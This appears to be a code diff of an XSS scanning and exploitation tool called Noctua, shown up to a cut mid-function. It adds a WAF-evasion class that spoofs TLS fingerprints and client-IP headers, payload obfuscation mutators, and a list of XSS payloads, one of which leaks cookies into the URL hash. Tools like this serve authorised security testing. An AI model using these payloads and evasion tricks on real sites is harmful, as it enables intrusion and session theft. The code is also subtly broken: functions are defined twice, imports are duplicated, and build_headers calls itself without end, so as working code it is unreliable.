@@ -7,9 +7,11 @@
 #  STANDARD & 3rd-PARTY IMPORTS
 # ─────────────────────────────────────────────────────────────────────────────
 import os
+import sys, asyncio
 import re
 import ssl
 import websocket 
+from urllib.parse import urlencode
 import sys
 import json
 import time
@@ -30,7 +32,7 @@ import time
 import json
 from urllib.parse import urlencode
 from typing import Dict, Any, Optional
-from playwright.sync_api import sync_playwright
+from playwright.async_api import async_playwright, Error as PlaywrightError
 from pathlib import Path
 from typing import Dict, List, Any, Optional, Tuple, Set
 from collections import defaultdict
@@ -57,12 +59,6 @@ except ImportError:
     httpx = None
 
 try:
-    from playwright.async_api import async_playwright, Error as PlaywrightError
-    from playwright.sync_api import sync_playwright
-except ImportError:
-    async_playwright = sync_playwright = None
-
-try:
     from wafw00f.main import WafW00F
 except ImportError:
     WafW00F = None
@@ -75,32 +71,56 @@ DNSLOG_PROVIDERS = {
     'oast': 'oast.pro'
 }
 
-# NEW: For structured output
+# Correct WAFW00F import
+try:
+    from wafw00f.main import WAFW00F
+except ImportError:
+    WAFW00F = None
+
+# Async Playwright only
+try:
+    from playwright.async_api import async_playwright, Error as PlaywrightError
+except ImportError:
+    async_playwright = None
+
+# Heavy ML deps...
+try:
+    import torch
+    from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
+except ImportError:
+    torch = AutoTokenizer = AutoModelForMaskedLM = hf_log = None
+
+try:
+    import httpx
+except ImportError:
+    httpx = None
+
+# SARIF output
 try:
     from sarif_om import SarifLog, Tool, Run, Result, Message, Location, PhysicalLocation, ArtifactLocation
 except ImportError:
-    SarifLog = None # Dependency for SARIF output
+    SarifLog = None
 
 # ─────────────────────────────────────────────────────────────────────────────
 #  CONSTANTS
 # ─────────────────────────────────────────────────────────────────────────────
-VERSION             = "12.0 Enterprise"
-MODEL               = "microsoft/codebert-base"
-LOGFILE             = Path("Noctua_xss_findings.md")
+VERSION          = "12.0 Enterprise"
+MODEL            = "microsoft/codebert-base"
+LOGFILE          = Path("Noctua_xss_findings.md")
+DEF_THREADS      = 16
+MAX_STATIC_PAGES = 300
+MAX_NESTED_DEPTH = 5
+RATE_LIMIT_SLEEP = 0.05
+SESSION_SPLICE_MS= 100
+JITTER_MIN_MS    = 20
+JITTER_MAX_MS    = 200
+VERIFY_TIMEOUT   = 9000
+HTTP_TIMEOUT     = 12
+HEADLESS_WAIT    = 3500
 
-# Concurrency / limits
-DEF_THREADS         = 16
-MAX_STATIC_PAGES    = 300
-MAX_NESTED_DEPTH    = 5
+# Shared HTTP session
+SESSION = requests.Session()
 
-# Timings / jitter
-RATE_LIMIT_SLEEP    = 0.05
-SESSION_SPLICE_MS   = 100
-JITTER_MIN_MS       = 20
-JITTER_MAX_MS       = 200
-VERIFY_TIMEOUT      = 9000
-HTTP_TIMEOUT        = 12
-HEADLESS_WAIT       = 3500
 
 # WAF spoof header catalogue
 WAF_SPOOF_HEADERS = [
@@ -319,13 +339,7 @@ class DiscoveryEngine:
 # ─────────────────────────────────────────────────────────────────────────────
 class DomXssAnalyzer:
     """Uses Playwright to find DOM-based XSS vulnerabilities."""
-    
-    # Common JavaScript sinks that can lead to XSS
-    SINKS = [
-        "eval", "setTimeout", "setInterval", "document.write", "document.writeln",
-        ".innerHTML", ".outerHTML", "new Function"
-    ]
-    # Common JavaScript sources of user input
+
     SOURCES = [
         "location.href", "location.search", "location.hash", "document.URL",
         "document.documentURI", "window.name", "document.cookie"
@@ -338,32 +352,51 @@ class DomXssAnalyzer:
     async def analyze(self):
         """Analyzes the current page for source-to-sink data flows."""
         logging.info(f"[DOM-XSS] Analyzing {self.page.url} for DOM sinks.")
-        
-        # Inject a script to hook dangerous functions (sinks)
+
+        # inside DomXssAnalyzer.analyze()
         await self.page.add_init_script(f"""
+        (() => {{
+            const XSS_SOURCES = {json.dumps(self.SOURCES)};
             window._dom_xss_found = [];
-            const original_eval = window.eval;
-            window.eval = function(str) {{
-                if ({self._get_source_check('str')}) {{
-                    console.warn('[DOM-XSS] Tainted data reached eval sink:', str);
-                    window._dom_xss_found.push({{sink: 'eval', payload: str}});
+
+            const isTainted = v => XSS_SOURCES.some(src => v && v.includes(src));
+
+            /* hook eval */
+            const origEval = window.eval;
+            window.eval = function (payload) {{
+                if (isTainted(payload)) {{
+                    window._dom_xss_found.push({{sink:'eval', payload}});
+                    console.warn('[DOM-XSS] eval →', payload);
                 }}
-                return original_eval(str);
+                return origEval.call(this, payload);
             }};
-            // ... similar hooks for other sinks like innerHTML setters ...
+
+            /* hook innerHTML */
+            const d = Object.getOwnPropertyDescriptor(Element.prototype,'innerHTML');
+            Object.defineProperty(Element.prototype,'innerHTML', {{
+                set(val) {{
+                    if (isTainted(val)) {{
+                        window._dom_xss_found.push({{sink:'innerHTML', payload: val}});
+                        console.warn('[DOM-XSS] innerHTML →', val);
+                    }}
+                    return d.set.call(this, val);
+                }}
+            }});
+        }})();
         """)
-        
-        # Reload the page with a canary in the URL fragment
+
+
+        # Reload the page with a unique fragment to trigger hooks
         canary = "NoctuaCanary" + randstr(8)
-        await self.page.goto(self.page.url + "#" + canary, wait_until='networkidle')
-        
-        # Check if our canary triggered any hooks
+        await self.page.goto(self.page.url + "#" + canary, wait_until="networkidle")
+        await self.page.wait_for_timeout(500)
+
+        # Collect any findings
         found = await self.page.evaluate("() => window._dom_xss_found")
-        if found:
-            for vuln in found:
-                logging.critical(f"[DOM-XSS] Potential DOM XSS found! Sink: {vuln['sink']}, Payload: {vuln['payload']}")
-                self.vulnerabilities.append(vuln)
-    
+        for vuln in found or []:
+            logging.critical(f"[DOM-XSS] Potential DOM XSS found! Sink: {vuln['sink']}, Payload: {vuln['payload']}")
+            self.vulnerabilities.append(vuln)
+
     def _get_source_check(self, var_name: str) -> str:
         """Helper to  JS code that checks if a variable contains tainted data."""
         return " || ".join([f"{var_name}.includes(source)" for source in self.SOURCES])
@@ -644,6 +677,48 @@ else:
     def ai_mutate(template: str) -> str:
         return template.replace("MASK", "alert(1)")
 
+# quick waf unblocker
+# ─────────────────────────────────────────────────────────────────────────────
+#  WAF / CDN UNBLOCKER  –  JA3-scrambler + header-sprayer
+# ─────────────────────────────────────────────────────────────────────────────
+class WAFUnblocker:
+    """
+    • Randomises JA3 / TLS-fingerprint by shuffling ciphers + ALPN
+    • Sprays rotating spoof-headers & X-Forwarded-chains
+    • Provides per-request 'extra_headers' and 'extra_args' for requests / Playwright
+    """
+    _ALPNS = [["h2", "http/1.1"], ["http/1.1"], ["h2"], ["spdy/3.1", "http/1.1"]]
+    _CIPHERS = [
+        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
+        "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
+        "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
+        "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
+    ]
+    _IP_CHAIN = lambda: ",".join(f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(random.randint(2,5)))
+
+    def build_headers(self) -> Dict[str,str]:
+        hdr = WAFUnblocker().build_headers()  # original helper
+        # add layered X-Forwarded-For chains & misc CDN headers
+        hdr.update({
+            "X-Forwarded-For": self._IP_CHAIN(),
+            "Forwarded": f'for={self._IP_CHAIN()};proto=https',
+            "True-Client-IP": "127.0.0.1",
+            "CF-Connecting-IP": "127.0.0.1",
+            "X-Amzn-Trace-Id": f"Root=1-{randstr(8)}-{randstr(24)}"
+        })
+        return hdr
+
+    def playwright_args(self) -> List[str]:
+        # vary TLS cipher-suite order & ALPN via Chromium flags
+        c = random.choice(self._CIPHERS)
+        a = random.choice(self._ALPNS)
+        return [
+            f"--tls13-ciphers={c}",
+            f"--ssl-version-max=tls1.3",
+            f'--alpn-protos={",".join(a)}'
+        ]
+
+
 # ─────────────────────────────────────────────────────────────────────────────
 #  POLYMORPHIC OBFUSCATION
 # ─────────────────────────────────────────────────────────────────────────────
@@ -680,6 +755,11 @@ obf_base = [
     lambda p: p.swapcase(),
     lambda p: p.replace('\x00',''),
     lambda p: urllib.parse.quote(urllib.parse.quote(p)),
+    lambda p: "".join(f"\\{oct(ord(c))[2:]}" for c in p),                 
+    lambda p: "".join(f"\\x{ord(c):02x}\\{randstr(1)}" for c in p),       
+    lambda p: "\\u202E" + p[::-1] + "\\u202C",                            
+    lambda p: "".join(f"&#{ord(c)};" if i%2 else c for i,c in enumerate(p)), 
+    lambda p: re.sub(r'.', lambda m: f"\\u{ord(m.group(0)):04X}", p)     
 ]
 
 def _expand_obf() -> List:
@@ -849,6 +929,24 @@ BASE_PAYLOADS = [
     "<track onerror=alert(1)>",
     "<fieldset onpointerenter=alert(1)>",
     "<svg xml:base=\"javascript:alert(1)\">",
+
+    # Heavy network-sink probes
+    "<script>let a=document.createElement`iframe`;a.srcdoc=`<svg onload=top>`;document.body.append(a)</script>",
+    "<svg><script>(''+document.cookie).replace(/./g,(c,i)=>location.hash+=c)</script></svg>",
+    "<script>fetch('/x',{method:'POST',body:`<img src=x onerror=alert(1)>`})</script>",
+    "<script>var x=new XMLHttpRequest();x.open('POST','/x');x.send('<svg onload=alert(1)>');</script>",
+    "<script>new WebSocket('ws://'+location.host+'/ws?msg=<img src=x onerror=alert(1)>');</script>",
+    # DOM-sink chainers
+    "<svg><script>document.documentElement.innerHTML='<img src=x onerror=alert(1)>'</script></svg>",
+    "<script>setTimeout('document.write(\\'<img src=x onerror=alert(1)>\\')',1)</script>",
+    # CSS & style abuse
+    "<style>@keyframes x{}</style><div style=\"animation-name:x;behavior:url(javascript:alert(1))\">",
+    # postMessage / Broadcast
+    "<script>new BroadcastChannel('c').postMessage('<img src=x onerror=alert(1)>');</script>",
+    "<iframe srcdoc='<script>parent.postMessage(`<img src=x onerror=alert(1)>`,\"*\")</script>'></iframe>",
+    # CSP-breakers & module tricks
+    "<script type=module>import('data:text/javascript,alert(1)')</script>",
+    "<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">"
 ]
 
 EXTRA_BASE = [
@@ -1028,68 +1126,208 @@ def get_authenticated_session()->requests.Session:
 
 SESSION=get_authenticated_session()
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  PLAYWRIGHT VERIFY
-# ─────────────────────────────────────────────────────────────────────────────
-def verify(url:str,method:str,data:Dict[str,Any],is_json:bool=False)->bool:
-    """Attempt to confirm XSS in a real browser; fallback to reflection."""
-    if sync_playwright:
-        try:
-            screenshot_dir=Path("screenshots"); screenshot_dir.mkdir(exist_ok=True)
-            sig=hashlib.md5((url+json.dumps(data,sort_keys=True)).encode()).hexdigest()[:8]
-            with sync_playwright() as p:
-                br=p.chromium.launch(headless=not args.headed,
-                                     args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
-                ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
-                page=ctx.new_page()
-                page.add_init_script("""
-                    (()=>{window._xss_triggered=false;window._xss_reason='none';
-                    function mark(r){window._xss_triggered=true;window._xss_reason=r||'unknown';}
-                    ['alert','confirm','prompt'].forEach(f=>{const o=window[f];window[f]=(...a)=>{mark(f);return o(...a);};});
-                    document.addEventListener('securitypolicyviolation',()=>mark('csp'));
-                    new MutationObserver(ms=>ms.forEach(m=>m.addedNodes.forEach(n=>{
-                        if(n.outerHTML&&/(script|onerror|iframe|svg)/i.test(n.outerHTML))mark('mutation');
-                    }))).observe(document.documentElement,{childList:true,subtree:true});})();
-                """)
-                page.on("dialog",lambda d:d.dismiss())
-                if method.upper()=="GET":
-                    qs=urllib.parse.urlencode(data)
-                    page.goto(f"{url}?{qs}" if qs else url,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
-                else:
-                    hdr={"Content-Type":"application/json"} if is_json else {"Content-Type":"application/x-www-form-urlencoded"}
-                    body=json.dumps(data) if is_json else urllib.parse.urlencode(data)
-                    page.goto(url,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
-                    page.evaluate("(u,h,b)=>fetch(u,{method:'POST',headers:h,body:b})",url,hdr,body)
-                    page.wait_for_timeout(1500)
-                before=screenshot_dir/f"{sig}_before.png"; after=screenshot_dir/f"{sig}_after.png"
-                page.screenshot(path=str(before),full_page=True)
-                page.wait_for_timeout(HEADLESS_WAIT)
-                page.screenshot(path=str(after),full_page=True)
-                trig=page.evaluate("window._xss_triggered"); reason=page.evaluate("window._xss_reason")
-                page.close(); ctx.close(); br.close()
-                if trig:
-                    entry=f"- **XSS** {method} `{url}` reason={reason} screenshots=({before.name},{after.name})\n"
-                    with log_lock: LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry if LOGFILE.exists() else f"# Noctua Findings v{VERSION}\n\n{entry}","utf-8")
-                    logging.info(entry.strip()); return True
-        except Exception as e:
-            dbg(f"[verify-playwright] {e}")
-    # Fallback: simple reflection
+# Replace the sync_playwright imports with async_playwright
+from playwright.async_api import async_playwright, Error as PlaywrightError
+
+# Update your verify function to use async throughout
+async def verify(url: str, method: str, data: Dict[str, Any], is_json: bool = False, headed: bool = False) -> bool:
+    """Async verification function using Playwright's async API"""
     try:
-        if method.upper()=="GET":
-            r=SESSION.get(url,params=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
-        else:
-            if is_json:
-                r=SESSION.post(url,json=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(
+                headless=not headed,
+                args=[
+                    "--disable-web-security",
+                    "--ignore-certificate-errors",
+                    "--no-sandbox",
+                    "--disable-gpu"
+                ]
+            )
+            context = await browser.new_context(
+                ignore_https_errors=True,
+                user_agent=UserAgent().random,
+                java_script_enabled=True
+            )
+            page = await context.new_page()
+
+            # Setup XSS detection
+            await page.add_init_script("""
+                window._xss_detected = false;
+                const orig = window.alert;
+                window.alert = function(){ window._xss_detected = true; return orig.apply(this, arguments); };
+            """)
+
+            # Replay the request
+            if method.upper() == "GET":
+                target = f"{url}?{urlencode(data)}" if data else url
+                await page.goto(target, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
             else:
-                r=SESSION.post(url,data=data,headers=random_headers(),timeout=HTTP_TIMEOUT,verify=False)
-        body=r.text or ""
-        if any(isinstance(v,str) and v in body for v in data.values()):
-            entry=f"- **XSS** {method} `{url}` reflected\n"
-            with log_lock: LOGFILE.write_text(LOGFILE.read_text('utf-8')+entry if LOGFILE.exists() else f"# Noctua Findings v{VERSION}\n\n{entry}","utf-8")
-            logging.info(entry.strip()); return True
+                await page.goto(url, wait_until="networkidle")
+                if is_json:
+                    await page.evaluate(
+                        """([u,d]) => fetch(u, {
+                            method: 'POST',
+                            headers: {'Content-Type':'application/json'},
+                            body: JSON.stringify(d)
+                        })""",
+                        [url, data]
+                    )
+                else:
+                    await page.evaluate(
+                        """([u,d]) => fetch(u, {
+                            method: 'POST',
+                            headers: {'Content-Type':'application/x-www-form-urlencoded'},
+                            body: new URLSearchParams(d).toString()
+                        })""",
+                        [url, data]
+                    )
+                await page.wait_for_timeout(2000)
+
+            detected = await page.evaluate("window._xss_detected")
+            if detected:
+                await _save_evidence_async(page, url)
+            await browser.close()
+            return detected
     except Exception as e:
-        dbg(f"[verify-fallback] {e}")
-    return False
+        logging.error(f"[verify] Playwright error: {e}")
+        return False
+
+def ensure_event_loop_policy():
+    """Ensure compatible asyncio policy across platforms."""
+    if sys.platform == "win32":
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+def get_playwright_args():
+    """Return consistent browser args across OSes."""
+    return [
+        "--disable-web-security",
+        "--ignore-certificate-errors",
+        "--no-sandbox",
+        "--disable-gpu"
+    ]
+
+async def _save_evidence_async(page, url: str) -> None:
+    """Save screenshot as evidence of XSS."""
+    try:
+        fn = f"xss_{hashlib.md5(url.encode()).hexdigest()[:8]}.png"
+        path = Path("evidence") / fn
+        path.parent.mkdir(exist_ok=True)
+        await page.screenshot(path=str(path), full_page=True)
+    except Exception as e:
+        logging.debug(f"[save_evidence_async] {e}")
+
+async def verify_with_playwright_async(
+    url: str, method: str, data: Dict[str, Any],
+    is_json: bool, headed: bool
+) -> bool:
+    """Fully async XSS detection using Playwright with WAF-unblocker tweaks."""
+    try:
+        async with async_playwright() as p:
+
+            # launch with additional TLS-fingerprint / ALPN mutations
+            browser = await p.chromium.launch(
+                headless=not headed,
+                args=get_playwright_args() + WAFUnblocker().playwright_args()   # ← merged extra flags
+            )
+
+            # create context that sprays advanced spoof headers
+            context = await browser.new_context(
+                ignore_https_errors=True,
+                java_script_enabled=True,
+                extra_http_headers=WAFUnblocker().build_headers(),             # ← header cloak
+                user_agent="Mozilla/5.0 (Noctua Canary System)"
+            )
+
+            page = await context.new_page()
+
+            # detection hook
+            await page.add_init_script("""
+                window._xss_detected = false;
+                const orig = window.alert;
+                window.alert = function() {
+                    window._xss_detected = true;
+                    return orig.apply(this, arguments);
+                };
+            """)
+
+            # prepare target
+            target = url
+            if method.upper() == "GET" and data:
+                from urllib.parse import urlencode
+                target = f"{url}?{urlencode(data)}"           # valid Python f-string
+                
+            await page.goto(target, wait_until="networkidle", timeout=VERIFY_TIMEOUT)
+
+            if method.upper() == "POST":
+                payload = json.dumps(data) if is_json else "&".join(f"{k}={v}" for k, v in data.items())
+                ctype   = "application/json" if is_json else "application/x-www-form-urlencoded"
+                await page.evaluate(
+                    """(u,b,ct)=>fetch(u,{method:'POST',headers:{'Content-Type':ct},body:b})""",
+                    url, payload, ctype
+                )
+                await page.wait_for_timeout(2000)
+
+            detected = await page.evaluate("window._xss_detected")
+            if detected:
+                await _save_evidence_async(page, url)
+
+            await browser.close()
+            return detected
+
+    except Exception as e:
+        logging.error(f"[verify_with_playwright_async] Error: {e}")
+        return False
+
+async def run_dom_analysis(
+    urls: Set[str],
+    reporter,
+    headed: bool
+):
+    """DOM XSS scanning using async Playwright."""
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(
+                headless=not headed,
+                args=get_playwright_args()
+            )
+            context = await browser.new_context(ignore_https_errors=True)
+            page = await context.new_page()
+
+            analyzer = DomXssAnalyzer(page)  # ← ensure this is async-aware
+
+            for url in urls:
+                await page.goto(url, wait_until="networkidle", timeout=VERIFY_TIMEOUT)
+                await analyzer.analyze()
+
+                for vuln in analyzer.vulnerabilities:
+                    reporter.add_finding(
+                        url=url,
+                        param="DOM",
+                        payload=vuln["payload"],
+                        vuln_type="DOM XSS",
+                        evidence=f"Sink: {vuln['sink']}"
+                    )
+
+            await browser.close()
+    except Exception as e:
+        logging.error(f"[run_dom_analysis] Error: {e}")
+
+def verify_reflection_fallback(
+    url: str,
+    method: str,
+    data: Dict[str, Any],
+    is_json: bool
+) -> bool:
+    """Reflection heuristic via basic response echoing."""
+    try:
+        import requests  # uses SESSION if available
+        if method.upper() == "GET":
+            r = requests.get(url, params=data, timeout=HTTP_TIMEOUT)
+        else:
+            r = requests.post(url, json=data if is_json else None, data=None if is_json else data, timeout=HTTP_TIMEOUT)
+        return any(str(v) in r.text for v in data.values())
+    except Exception:
+        return False
 
 # ─────────────────────────────────────────────────────────────────────────────
 #  FINDINGS LOG / SARIF / SLACK
@@ -1245,65 +1483,265 @@ def crawl_static(root:str,cap:int,visited:set[str]|None=None)->List[Dict[str,Any
                 if norm(lurl) not in visited: queue.append(lurl)
     return results
 
-def crawl_dynamic(root:str)->List[Dict[str,Any]]:
-    if not sync_playwright: return []
-    found,seen=set(),[]
-    host=urllib.parse.urlparse(root).netloc.lower()
-    def norm(u:str)->str: return urllib.parse.urlparse(u)._replace(query="",fragment="").geturl().lower()
-    try:
-        with sync_playwright() as p:
-            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
-            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
-            page=ctx.new_page()
-            def on_req(req):
-                u=norm(req.url); 
-                if urllib.parse.urlparse(u).netloc.lower()!=host or u in seen: 
-                    return
-                seen.append(u)
-                m=req.method.upper(); hdr=req.headers.get("content-type","").lower()
-                is_json="json" in hdr or "graphql" in hdr
-                try: data=json.loads(req.post_data or "{}"); params=list(data.keys())
-                except Exception:
-                    qs=urllib.parse.urlparse(req.url).query; params=list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
-                found.add(json.dumps({"url":u,"method":m if m in ("POST","PUT") else "GET","json":is_json,"params":params,"template":data if is_json else {}}))
-            page.on("request",on_req)
-            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle"); page.wait_for_timeout(2000)
-            ctx.close(); br.close()
-    except Exception as e:
-        dbg(f"[crawl_dynamic] {e}")
+
+def normalize_url(u: str) -> str:
+    p = urllib.parse.urlparse(u)
+    return p._replace(query="", fragment="").geturl().lower()
+
+from playwright.async_api import async_playwright, Error as PlaywrightError
+
+async def crawl_dynamic_async(root: str) -> List[Dict[str, Any]]:
+    """
+    Asynchronously crawl dynamic requests made when loading the page.
+    Returns a list of dicts with keys: url, method, json (bool), params (list), template (dict).
+    """
+    found: set[str] = set()
+    host = urllib.parse.urlparse(root).netloc.lower()
+
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=True)
+        context = await browser.new_context(ignore_https_errors=True)
+        page = await context.new_page()
+
+        async def on_request(request):
+            u = normalize_url(request.url)
+            if urllib.parse.urlparse(u).netloc.lower() != host or u in found:
+                return
+            found.add(u)
+            m = request.method.upper()
+            hdr = (request.headers.get("content-type") or "").lower()
+            is_json = "json" in hdr or "graphql" in hdr
+            try:
+                data = json.loads(request.post_data or "{}")
+                params = list(data.keys())
+            except Exception:
+                qs = urllib.parse.urlparse(request.url).query
+                params = list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
+                data = {}
+            entry = {
+                "url": u,
+                "method": m if m in ("POST", "PUT") else "GET",
+                "json": is_json,
+                "params": params,
+                "template": data if is_json else {}
+            }
+            found.add(json.dumps(entry))
+
+        page.on("request", on_request)
+
+        # try networkidle first, then fall back to load on timeout
+        try:
+            await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+        except PlaywrightError as e:
+            logging.warning(f"[crawl_dynamic_async] Timeout loading {root}: {e}. Retrying with 'load'.")
+            try:
+                await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="load")
+            except PlaywrightError as e2:
+                logging.error(f"[crawl_dynamic_async] Fallback 'load' failed for {root}: {e2}")
+
+        await page.wait_for_timeout(2000)
+        await context.close()
+        await browser.close()
+
     return [json.loads(x) for x in found]
 
-def spa_dynamic_crawl(root:str,max_clicks:int=20)->List[Dict[str,Any]]:
-    if not sync_playwright: return []
-    found,seen_req=set(),set()
-    host=urllib.parse.urlparse(root).netloc.lower()
-    def norm(u:str)->str: return urllib.parse.urlparse(u)._replace(query="",fragment="").geturl().lower()
-    try:
-        with sync_playwright() as p:
-            br=p.chromium.launch(headless=True,args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"])
-            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
-            page=ctx.new_page()
-            def on_req(req):
-                u=norm(req.url); sig=f"{req.method}:{u}"
-                if urllib.parse.urlparse(u).netloc.lower()!=host or sig in seen_req: return
-                seen_req.add(sig)
-                m=req.method.upper(); is_json="json" in req.headers.get("content-type","").lower()
+
+async def spa_dynamic_crawl_async(
+    root: str,
+    max_clicks: int = 20
+) -> List[Dict[str, Any]]:
+    """
+    Asynchronously crawl a SPA by clicking through links/buttons.
+    Returns a list of dicts with keys: url, method, json, params, template.
+    """
+    found: set[str] = set()
+    seen_req: set[str] = set()
+    host = urllib.parse.urlparse(root).netloc.lower()
+
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(
+            headless=True,
+            args=["--disable-web-security", "--ignore-certificate-errors", "--no-sandbox"]
+        )
+        context = await browser.new_context(
+            ignore_https_errors=True,
+            user_agent=UserAgent().random
+        )
+        page: Page = await context.new_page()
+
+        async def on_request(request):
+            u = normalize_url(request.url)
+            sig = f"{request.method}:{u}"
+            if urllib.parse.urlparse(u).netloc.lower() != host or sig in seen_req:
+                return
+            seen_req.add(sig)
+            m = request.method.upper()
+            hdr = (request.headers.get("content-type") or "").lower()
+            is_json = "json" in hdr
+            try:
+                body = json.loads(request.post_data or "{}")
+                params = list(body.keys())
+            except Exception:
+                qs = urllib.parse.urlparse(request.url).query
+                params = list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
+                body = {}
+
+            entry = json.dumps({
+                "url": u,
+                "method": m if m in ("POST", "PUT") else "GET",
+                "json": is_json,
+                "params": params,
+                "template": body if is_json else {}
+            })
+            found.add(entry)
+
+        page.on("request", on_request)
+        await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+
+        # simulate clicks
+        for _ in range(max_clicks):
+            els = await page.query_selector_all("a[href],button,[role=button],.router-link")
+            random.shuffle(els)
+            for e in els:
                 try:
-                    body=json.loads(req.post_data or "{}"); params=list(body.keys())
+                    await e.click(timeout=2000)
+                    await page.wait_for_timeout(1500)
+                    break
                 except Exception:
-                    qs=urllib.parse.urlparse(req.url).query; params=list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
-                found.add(json.dumps({"url":u,"method":m if m in ("POST","PUT") else "GET",
-                                      "json":is_json,"params":params,"template":body if is_json else {}}))
-            page.on("request",on_req)
-            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
-            for _ in range(max_clicks):
-                els=page.query_selector_all("a[href],button,[role=button],.router-link"); random.shuffle(els)
-                for e in els:
-                    try: e.click(timeout=2000); page.wait_for_timeout(1500); break
-                    except Exception: continue
-            ctx.close(); br.close()
-    except Exception as e:
-        dbg(f"[spa_dynamic_crawl] {e}")
+                    continue
+
+        await context.close()
+        await browser.close()
+
+    return [json.loads(x) for x in found]
+
+
+def normalize_url(u: str) -> str:
+    p = urllib.parse.urlparse(u)
+    return p._replace(query="", fragment="").geturl().lower()
+
+async def crawl_dynamic_async(root: str) -> List[Dict[str, Any]]:
+    """
+    Asynchronously crawl dynamic requests made when loading the page.
+    Returns a list of dicts with keys: url, method, json (bool), params (list), template (dict).
+    """
+    found: set[str] = set()
+    seen: set[str] = set()
+    host = urllib.parse.urlparse(root).netloc.lower()
+
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(
+            headless=True,
+            args=["--disable-web-security", "--ignore-certificate-errors", "--no-sandbox"]
+        )
+        context = await browser.new_context(
+            ignore_https_errors=True,
+            user_agent=UserAgent().random
+        )
+        page: Page = await context.new_page()
+
+        async def on_request(request):
+            u = normalize_url(request.url)
+            if urllib.parse.urlparse(u).netloc.lower() != host or u in seen:
+                return
+            seen.add(u)
+            m = request.method.upper()
+            hdr = (request.headers.get("content-type") or "").lower()
+            is_json = "json" in hdr or "graphql" in hdr
+            try:
+                data = json.loads(request.post_data or "{}")
+                params = list(data.keys())
+            except Exception:
+                qs = urllib.parse.urlparse(request.url).query
+                params = list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
+                data = {}
+
+            entry = json.dumps({
+                "url": u,
+                "method": m if m in ("POST", "PUT") else "GET",
+                "json": is_json,
+                "params": params,
+                "template": data if is_json else {}
+            })
+            found.add(entry)
+
+        page.on("request", on_request)
+        await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+        await page.wait_for_timeout(2000)
+
+        await context.close()
+        await browser.close()
+
+    return [json.loads(x) for x in found]
+
+
+async def spa_dynamic_crawl_async(
+    root: str,
+    max_clicks: int = 20
+) -> List[Dict[str, Any]]:
+    """
+    Asynchronously crawl a SPA by clicking through links/buttons.
+    Returns a list of dicts with keys: url, method, json, params, template.
+    """
+    found: set[str] = set()
+    seen_req: set[str] = set()
+    host = urllib.parse.urlparse(root).netloc.lower()
+
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(
+            headless=True,
+            args=["--disable-web-security", "--ignore-certificate-errors", "--no-sandbox"]
+        )
+        context = await browser.new_context(
+            ignore_https_errors=True,
+            user_agent=UserAgent().random
+        )
+        page: Page = await context.new_page()
+
+        async def on_request(request):
+            u = normalize_url(request.url)
+            sig = f"{request.method}:{u}"
+            if urllib.parse.urlparse(u).netloc.lower() != host or sig in seen_req:
+                return
+            seen_req.add(sig)
+            m = request.method.upper()
+            hdr = (request.headers.get("content-type") or "").lower()
+            is_json = "json" in hdr
+            try:
+                body = json.loads(request.post_data or "{}")
+                params = list(body.keys())
+            except Exception:
+                qs = urllib.parse.urlparse(request.url).query
+                params = list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
+                body = {}
+
+            entry = json.dumps({
+                "url": u,
+                "method": m if m in ("POST", "PUT") else "GET",
+                "json": is_json,
+                "params": params,
+                "template": body if is_json else {}
+            })
+            found.add(entry)
+
+        page.on("request", on_request)
+        await page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
+
+        # simulate clicks
+        for _ in range(max_clicks):
+            els = await page.query_selector_all("a[href],button,[role=button],.router-link")
+            random.shuffle(els)
+            for e in els:
+                try:
+                    await e.click(timeout=2000)
+                    await page.wait_for_timeout(1500)
+                    break
+                except Exception:
+                    continue
+
+        await context.close()
+        await browser.close()
+
     return [json.loads(x) for x in found]
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1358,45 +1796,282 @@ def set_deep(obj:Any,path:str,val:str)->None:
                 if part not in cur or not isinstance(cur[part],(dict,list)): cur[part]={}
                 cur=cur[part]
 
-def fuzz_http(t:Dict[str,Any],use_chunked:bool=False)->None:
-    ext=Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
-    if ext in static_exts: return
-    key=f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}"
